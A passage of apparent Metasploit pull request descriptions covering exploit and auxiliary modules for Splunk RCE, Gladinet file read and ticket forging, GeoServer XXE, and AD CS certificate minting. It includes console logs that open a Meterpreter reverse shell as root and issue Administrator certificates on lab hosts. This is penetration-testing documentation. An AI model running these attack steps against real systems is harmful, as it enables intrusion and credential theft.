https://web.archive.org/web/20240914000921/https://psytester.github.io/CVE-2024-36985_SPLUNK_RCE_PoC/\r\n\r\n## Test Output\r\n```\r\nmsf6 > use linux/http/splunk_auth_rce_cve_2024_36985\r\n[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set RHOSTS 192.168.19.139\r\nRHOSTS => 192.168.19.139\r\nmsf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set RPORT 8000\r\nRPORT => 8000\r\nmsf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set FETCH_SRVPORT 8090\r\nFETCH_SRVPORT => 8090\r\nmsf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set PASSWORD password123\r\nPASSWORD => password123\r\nmsf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.19.130:4444 \r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] SUCCESSFUL LOGIN. 'admin' : 'password123'\r\n[+] The target appears to be vulnerable. Exploitable version found: 8.2.4, splunk_archiver app is enabled\r\n[*] Sending stage (3045380 bytes) to 192.168.19.139\r\n[*] Meterpreter session 1 opened (192.168.19.130:4444 -> 192.168.19.139:55936) at 2025-12-12 15:04:44 -0500\r\n\r\nmeterpreter > sysinfo\r\nComputer     : 192.168.19.139\r\nOS           : Ubuntu 18.04 (Linux 5.4.0-150-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter > getuid\r\nServer username: root\r\n```","title":"Add Splunk RCE Exploits (CVE-2022-43571 & CVE-2024-36985)"},{"body":"Hello Metasploit Team,\n\nThis PR adds two new auxiliary modules and updates the existing exploit module for Gladinet CentreStack/Triofox vulnerabilities.\n\n## Changes\n\n### Updated Exploit Module\nThe `gladinet_viewstate_deserialization_cve_2025_30406` exploit module has been updated to accept a `MACHINEKEY` option.\nThis change was made in response to new vulnerabilities discovered in Gladinet products (CVE-2025-11371 and related insecure cryptography issues).\nThese vulnerabilities allow attackers to extract the `machineKey` from the `Web.config` file.\nThe exploit now defaults to the hardcoded vulnerable key but can also use a custom `machineKey` extracted via the auxiliary modules.\n\n### New Auxiliary Modules\n\n1. **`gladinet_storage_lfi_cve_2025_11371`** - Exploits a Local File Inclusion vulnerability in the `/storage/t.dn` endpoint.\nThis module can read arbitrary files from the server's file system.\nIt can extract the `machineKey` from `Web.config` files and automatically suggests using the exploit module with the extracted key.\n\n2. **`gladinet_storage_access_ticket_forge`** - Forges access tickets for the `/storage/filesvr.dn` endpoint.\nThis is done by exploiting hardcoded cryptographic keys in `GladCtrl64.dll`.\nThis module can also read arbitrary files and extract `machineKey` values.\n\n### Shared Mixin\nA new mixin `Msf::Auxiliary::Gladinet` has been created to share common functionality between the auxiliary modules.\nThe mixin includes:\n- `machineKey` extraction from `Web.config` files\n- Automatic suggestion to use the exploit module with extracted keys\n- Common constants and helper methods\n\n## Purpose\n\nWhile these auxiliary modules are designed to work in conjunction with the exploit module (by extracting `machineKey` values), they are also fully functional standalone modules.\nThey can be used independently for:\n- Reading arbitrary files from vulnerable Gladinet installations\n- Extracting sensitive configuration information\n- Gathering intelligence about the target system\n\nThe modules follow Metasploit coding standards and include comprehensive documentation with real output examples.\n\n## Testing\n\nAll modules have been tested against:\n- Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019\n\nThe modules pass `rubocop`, `msftidy`, and `msftidy_docs` checks.\n","title":"Add Gladinet CentreStack/Triofox auxiliary modules and exploit"},{"body":"Hello Metasploit Team,\n\n## Description\n\nThis PR adds an auxiliary module for **CVE-2025-58360**, an XML External Entity (XXE) vulnerability in GeoServer that allows unauthenticated attackers to read arbitrary files from the server's file system via the WMS GetMap operation.\n\n## Vulnerability Overview\n\n**GeoServer versions <= 2.25.5 and >= 2.26.0, <= 2.26.1** contain an XXE vulnerability in the WMS GetMap operation. The vulnerability occurs when processing Styled Layer Descriptor (SLD) XML data, which allows attackers to inject malicious XML entities that reference local files.\n\nThis allows unauthenticated attackers to:\n- Read arbitrary files from the server's file system\n- Access sensitive configuration files\n- Potentially read credentials or other sensitive data\n\nThe vulnerability is accessible through the `/geoserver/wms` endpoint by sending a POST request with a malicious SLD containing an XXE entity. The file content is returned in the error message when the layer name contains the XXE entity reference.\n\n## Module Capabilities\n\n- Exploits unauthenticated XXE to read arbitrary files\n- Randomizes WMS GetMap parameters (width, height, bbox) for evasion\n- Extracts file content from error messages\n- Stores retrieved files as loot\n- Includes full documentation with Docker lab setup instructions\n\n## Testing\n\nSuccessfully tested against GeoServer 2.25.5 using Docker. The module successfully reads files such as `/etc/passwd` and other system files.\n\nThanks!\n\n","title":"Add GeoServer WMS GetMap XXE file read module (CVE-2025-58360)"},{"body":"Closes https://github.com/rapid7/metasploit-framework/issues/20587\r\n\r\nSummary\r\n- Added KrbClockSkew advanced option and parser to offset Kerberos timestamps\r\n- Propagate skew through Kerberos client/authenticators (LDAP/SMB/HTTP/WinRM/MSSQL) and scanners\r\n- Updated docs for new option and extended kerberos client specs for clock skew handling\r\n- Clean up kerberos client error handling/style per rubocop\r\n\r\nTesting\r\n- Start Postgres for tests (used Docker)\r\n```bash\r\ndocker rm -f msf-postgres\r\ndocker run -d --name msf-postgres \\\r\n  -e POSTGRES_USER=msftest \\\r\n  -e POSTGRES_PASSWORD=changeme \\\r\n  -e POSTGRES_DB=msftest \\\r\n  -p 5433:5432 \\\r\n  postgres:15\r\n\r\n```\r\n- Ensure config/database.yml test section matches:\r\n```yml\r\ntest:\r\n  adapter: postgresql\r\n  host: 127.0.0.1\r\n  port: 5433\r\n  database: msftest\r\n  username: msftest\r\n  password: changeme\r\n  pool: 5\r\n  timeout: 5000\r\n```\r\n- Migrate and run spec\r\n```bash\r\nDATABASE_URL=postgres://msftest:changeme@127.0.0.1:5433/msftest \\\r\nPGPASSWORD=changeme \\\r\nbundle _2.5.22_ exec rake db:create db:migrate RAILS_ENV=test\r\n\r\nDATABASE_URL=postgres://msftest:changeme@127.0.0.1:5433/msftest \\\r\nPGPASSWORD=changeme \\\r\nbundle _2.5.22_ exec rspec spec/lib/msf/core/exploit/remote/kerberos/client_spec.rb\r\n```\r\n\r\nUsing KrbClockSkew in msfconsole\r\n\r\n- Select a Kerberos-enabled module (e.g., LDAP cert finder):\r\n```bash\r\nuse auxiliary/gather/ldap_esc_vulnerable_cert_finder\r\nset LDAP::Auth kerberos\r\nset DomainControllerRhost 10.10.10.10\r\nset LDAP::Rhostname dc01.test.corp\r\nset DOMAIN test.corp\r\nset KrbClockSkew -5m     # or 120s, 1h, etc.\r\nshow advanced            # to verify the option is set\r\nrun\r\n```","title":"Added: Option to adjust kerberos clock "},{"body":"Adds a module to authenticate to Windows AD/CS web enrollment services to query available templates and/or mint certificates based on available templates.  It is essentially the same as `auxiliary/server/relay/esc8` but we proved the authentication rather than relaying the authentication.\r\n\r\n## Verification Steps\r\n\r\n### NTLM\r\n1. Install and configure the application\r\n    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host\r\n2. Start `msfconsole`\r\n2. Do: `use auxiliary/admin/http/web_enrollment_cert`\r\n3. Set the `RHOSTS` option to the AD CS Web Enrollment server\r\n4. Set the `HTTP::Auth` option to `ntlm`\r\n4. Run the module and wait for a request to be relayed\r\n\r\n### Kerberos\r\n1. Install and configure the application\r\n    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host\r\n2. Start `msfconsole`\r\n2. Do: `use auxiliary/admin/http/web_enrollment_cert`\r\n3. Set the `RHOSTS` option to the AD CS Web Enrollment server\r\n4. Set the `HTTP::Auth` option to `kerberos`\r\n5. Set the `DOMAIN` option to the FQDN\r\n6. Set the `DomainControllerRhost` if it is not available through DNS\r\n4. Run the module and wait for a request to be relayed\r\n\r\n## Scenarios\r\n\r\n<details><summary>NTLM</summary>\r\n\r\n```\r\nmsf auxiliary(admin/http/web_enrollment_cert) > show options\r\n\r\nModule options (auxiliary/admin/http/web_enrollment_cert):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   MODE       ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h,\r\n                                         sapni, socks4, http, socks5\r\n   RHOSTS     10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met\r\n                                         asploit.html\r\n   RPORT      80               yes       The target port (TCP)\r\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\r\n   TARGETURI  /certsrv/        yes       The URI for the cert server.\r\n   THREADS    1                yes       The number of concurrent threads (max one per host)\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\n   When MODE is SPECIFIC_TEMPLATE:\r\n\r\n   Name           Current Setting  Required  Description\r\n   ----           ---------------  --------  -----------\r\n   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf auxiliary(admin/http/web_enrollment_cert) > show advanced\r\n\r\nModule advanced options (auxiliary/admin/http/web_enrollment_cert):\r\n\r\n   Name                     Current Setting                    Required  Description\r\n   ----                     ---------------                    --------  -----------\r\n   DOMAIN                   EXAMPLE                            yes       The domain to use for Windows authentication\r\n   DigestAuthIIS            true                               no        Conform to IIS, should work for most servers. Only set to\r\n                                                                         false for non-IIS servers\r\n   FingerprintCheck         true                               no        Conduct a pre-exploit fingerprint verification\r\n   HTTP::Auth               ntlm                               yes       The Authentication mechanism to use (Accepted: auto, ntlm,\r\n                                                                          kerberos, plaintext, none)\r\n   HttpClientTimeout                                           no        HTTP connection and receive timeout\r\n   HttpPassword             v3Mpassword                        no        The HTTP password to specify for authentication\r\n   HttpRawHeaders                                              no        Path to ERB-templatized raw headers to append to existing\r\n                                                                         headers\r\n   HttpTrace                false                              no        Show the raw HTTP requests and responses\r\n   HttpTraceColors          red/blu                            no        HTTP request and response colors for HttpTrace (unset to d\r\n                                                                         isable)\r\n   HttpTraceHeadersOnly     false                              no        Show HTTP headers only in HttpTrace\r\n   HttpUsername             Administrator                      no        The HTTP username to specify for authentication\r\n   SSLKeyLogFile                                               no        The SSL key log file\r\n   SSLServerNameIndication                                     no        SSL/TLS Server Name Indication (SNI)\r\n   SSLVersion               Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S\r\n                                                                         SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3\r\n                                                                         , TLS1, TLS1.1, TLS1.2)\r\n   ShowProgress             true                               yes       Display progress messages during a scan\r\n   ShowProgressPercent      10                                 yes       The interval in percent that progress should be shown\r\n   UserAgent                Mozilla/5.0 (Windows NT 10.0; Win  no        The User-Agent header to use for all requests\r\n                            64; x64) AppleWebKit/537.36 (KHTM\r\n                            L, like Gecko) Chrome/131.0.0.0 S\r\n                            afari/537.36 Edg/131.0.2903.86\r\n   VERBOSE                  true                               no        Enable detailed status messages\r\n   WORKSPACE                                                   no        Specify the workspace for this module\r\n\r\n\r\n   When HTTP::Auth is kerberos:\r\n\r\n   Name                            Current Setting                 Required  Description\r\n   ----                            ---------------                 --------  -----------\r\n   DomainControllerRhost           10.5.132.180                    no        The resolvable rhost for the Domain Controller\r\n   HTTP::Krb5Ccname                                                no        The ccache file to use for kerberos authentication\r\n   HTTP::KrbOfferedEncryptionType  AES256,AES128,RC4-HMAC,DES-CBC  yes       Kerberos encryption types to offer\r\n   s                               -MD5,DES3-CBC-SHA1\r\n   HTTP::Rhostname                 WIN-DRC9HCDIMAT                 no        The rhostname which is required for kerberos - the SPN\r\n   KrbCacheMode                    read-write                      yes       Kerberos ticket cache storage mode (Accepted: none, re\r\n                                                                             ad-only, write-only, read-write)\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf auxiliary(admin/http/web_enrollment_cert) > run\r\n[*] Checking 10.5.132.180 URL /certsrv/\r\n[*] Retrieving available template list, this may take a few minutes\r\n[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***\r\n[+] Available Certificates for EXAMPLE\\\\Administrator on : User, EFS, Administrator, EFSRecovery, ESC16_1, WebServer, SubCA\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the User template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template User and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=284&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template User saved to /home/tmoose/.msf4/loot/20251205150146_default_10.5.132.180_windows.ad.cs_351998.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the EFS template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template EFS and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=285&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template EFS saved to /home/tmoose/.msf4/loot/20251205150147_default_10.5.132.180_windows.ad.cs_398852.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the Administrator template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template Administrator and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=286&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template Administrator saved to /home/tmoose/.msf4/loot/20251205150148_default_10.5.132.180_windows.ad.cs_310441.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the EFSRecovery template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template EFSRecovery and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=287&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template EFSRecovery saved to /home/tmoose/.msf4/loot/20251205150151_default_10.5.132.180_windows.ad.cs_547091.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the ESC16_1 template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template ESC16_1 and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=288&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template ESC16_1 saved to /home/tmoose/.msf4/loot/20251205150152_default_10.5.132.180_windows.ad.cs_468150.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the WebServer template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template WebServer and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=289&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template WebServer saved to /home/tmoose/.msf4/loot/20251205150154_default_10.5.132.180_windows.ad.cs_702283.pfx\r\n[*] Creating certificate request for EXAMPLE\\\\Administrator using the SubCA template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] Certificate generated using template SubCA and EXAMPLE\\\\Administrator\r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=290&\r\n[+] Certificate for EXAMPLE\\\\Administrator using template SubCA saved to /home/tmoose/.msf4/loot/20251205150155_default_10.5.132.180_windows.ad.cs_846566.pfx\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(admin/http/web_enrollment_cert) > \r\n\r\n```\r\n\r\n</details>\r\n\r\n\r\n<details><summary>Kerberos</summary>\r\n\r\n```\r\nmsf auxiliary(admin/http/web_enrollment_cert) > set HTTP::Auth kerberos \r\nHTTP::Auth => kerberos\r\nmsf auxiliary(admin/http/web_enrollment_cert) > set domain example.com\r\ndomain => example.com\r\nmsf auxiliary(admin/http/web_enrollment_cert) > show options\r\n\r\nModule options (auxiliary/admin/http/web_enrollment_cert):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   MODE       ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h,\r\n                                         sapni, socks4, http, socks5\r\n   RHOSTS     10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met\r\n                                         asploit.html\r\n   RPORT      80               yes       The target port (TCP)\r\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\r\n   TARGETURI  /certsrv/        yes       The URI for the cert server.\r\n   THREADS    1                yes       The number of concurrent threads (max one per host)\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\n   When MODE is SPECIFIC_TEMPLATE:\r\n\r\n   Name           Current Setting  Required  Description\r\n   ----           ---------------  --------  -----------\r\n   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf auxiliary(admin/http/web_enrollment_cert) > show advanced\r\n\r\nModule advanced options (auxiliary/admin/http/web_enrollment_cert):\r\n\r\n   Name                     Current Setting                    Required  Description\r\n   ----                     ---------------                    --------  -----------\r\n   DOMAIN                   example.com                        yes       The domain to use for Windows authentication\r\n   DigestAuthIIS            true                               no        Conform to IIS, should work for most servers. Only set to\r\n                                                                         false for non-IIS servers\r\n   FingerprintCheck         true                               no        Conduct a pre-exploit fingerprint verification\r\n   HTTP::Auth               kerberos                           yes       The Authentication mechanism to use (Accepted: auto, ntlm,\r\n                                                                          kerberos, plaintext, none)\r\n   HttpClientTimeout                                           no        HTTP connection and receive timeout\r\n   HttpPassword             v3Mpassword                        no        The HTTP password to specify for authentication\r\n   HttpRawHeaders                                              no        Path to ERB-templatized raw headers to append to existing\r\n                                                                         headers\r\n   HttpTrace                false                              no        Show the raw HTTP requests and responses\r\n   HttpTraceColors          red/blu                            no        HTTP request and response colors for HttpTrace (unset to d\r\n                                                                         isable)\r\n   HttpTraceHeadersOnly     false                              no        Show HTTP headers only in HttpTrace\r\n   HttpUsername             Administrator                      no        The HTTP username to specify for authentication\r\n   SSLKeyLogFile                                               no        The SSL key log file\r\n   SSLServerNameIndication                                     no        SSL/TLS Server Name Indication (SNI)\r\n   SSLVersion               Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S\r\n                                                                         SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3\r\n                                                                         , TLS1, TLS1.1, TLS1.2)\r\n   ShowProgress             true                               yes       Display progress messages during a scan\r\n   ShowProgressPercent      10                                 yes       The interval in percent that progress should be shown\r\n   UserAgent                Mozilla/5.0 (Windows NT 10.0; Win  no        The User-Agent header to use for all requests\r\n                            64; x64) AppleWebKit/537.36 (KHTM\r\n                            L, like Gecko) Chrome/131.0.0.0 S\r\n                            afari/537.36 Edg/131.0.2903.86\r\n   VERBOSE                  true                               no        Enable detailed status messages\r\n   WORKSPACE                                                   no        Specify the workspace for this module\r\n\r\n\r\n   When HTTP::Auth is kerberos:\r\n\r\n   Name                            Current Setting                 Required  Description\r\n   ----                            ---------------                 --------  -----------\r\n   DomainControllerRhost           10.5.132.180                    no        The resolvable rhost for the Domain Controller\r\n   HTTP::Krb5Ccname                                                no        The ccache file to use for kerberos authentication\r\n   HTTP::KrbOfferedEncryptionType  AES256,AES128,RC4-HMAC,DES-CBC  yes       Kerberos encryption types to offer\r\n   s                               -MD5,DES3-CBC-SHA1\r\n   HTTP::Rhostname                 WIN-DRC9HCDIMAT                 no        The rhostname which is required for kerberos - the SPN\r\n   KrbCacheMode                    read-write                      yes       Kerberos ticket cache storage mode (Accepted: none, re\r\n                                                                             ad-only, write-only, read-write)\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf auxiliary(admin/http/web_enrollment_cert) > run\r\n[*] Retrieving available template list, this may take a few minutes\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150453_default_10.5.132.180_mit.kerberos.cca_822972.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150454_default_10.5.132.180_mit.kerberos.cca_873951.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***\r\n[+] Available Certificates for  on : User, EFS, Administrator, EFSRecovery, ESC16_1, WebServer, SubCA\r\n[*] Creating certificate request for  using the User template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150511_default_10.5.132.180_mit.kerberos.cca_838736.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150512_default_10.5.132.180_mit.kerberos.cca_378054.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template User and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=291&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150513_default_10.5.132.180_mit.kerberos.cca_678953.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150514_default_10.5.132.180_mit.kerberos.cca_501174.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template User saved to /home/tmoose/.msf4/loot/20251205150514_default_10.5.132.180_windows.ad.cs_544884.pfx\r\n[*] Creating certificate request for  using the EFS template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150517_default_10.5.132.180_mit.kerberos.cca_990027.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150518_default_10.5.132.180_mit.kerberos.cca_635605.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template EFS and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=292&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150519_default_10.5.132.180_mit.kerberos.cca_444641.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150519_default_10.5.132.180_mit.kerberos.cca_997726.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template EFS saved to /home/tmoose/.msf4/loot/20251205150520_default_10.5.132.180_windows.ad.cs_057988.pfx\r\n[*] Creating certificate request for  using the Administrator template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150523_default_10.5.132.180_mit.kerberos.cca_612724.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150523_default_10.5.132.180_mit.kerberos.cca_133172.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template Administrator and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=293&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150524_default_10.5.132.180_mit.kerberos.cca_076572.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150525_default_10.5.132.180_mit.kerberos.cca_141364.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template Administrator saved to /home/tmoose/.msf4/loot/20251205150525_default_10.5.132.180_windows.ad.cs_898079.pfx\r\n[*] Creating certificate request for  using the EFSRecovery template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150527_default_10.5.132.180_mit.kerberos.cca_092867.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150528_default_10.5.132.180_mit.kerberos.cca_037432.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template EFSRecovery and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=294&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150529_default_10.5.132.180_mit.kerberos.cca_777681.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150529_default_10.5.132.180_mit.kerberos.cca_507259.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template EFSRecovery saved to /home/tmoose/.msf4/loot/20251205150530_default_10.5.132.180_windows.ad.cs_382790.pfx\r\n[*] Creating certificate request for  using the ESC16_1 template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150532_default_10.5.132.180_mit.kerberos.cca_537546.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150533_default_10.5.132.180_mit.kerberos.cca_539326.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template ESC16_1 and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=295&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150534_default_10.5.132.180_mit.kerberos.cca_276777.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150535_default_10.5.132.180_mit.kerberos.cca_717376.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template ESC16_1 saved to /home/tmoose/.msf4/loot/20251205150535_default_10.5.132.180_windows.ad.cs_525359.pfx\r\n[*] Creating certificate request for  using the WebServer template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150537_default_10.5.132.180_mit.kerberos.cca_267094.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150538_default_10.5.132.180_mit.kerberos.cca_805790.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template WebServer and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=296&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150539_default_10.5.132.180_mit.kerberos.cca_341518.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150540_default_10.5.132.180_mit.kerberos.cca_437824.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template WebServer saved to /home/tmoose/.msf4/loot/20251205150540_default_10.5.132.180_windows.ad.cs_080961.pfx\r\n[*] 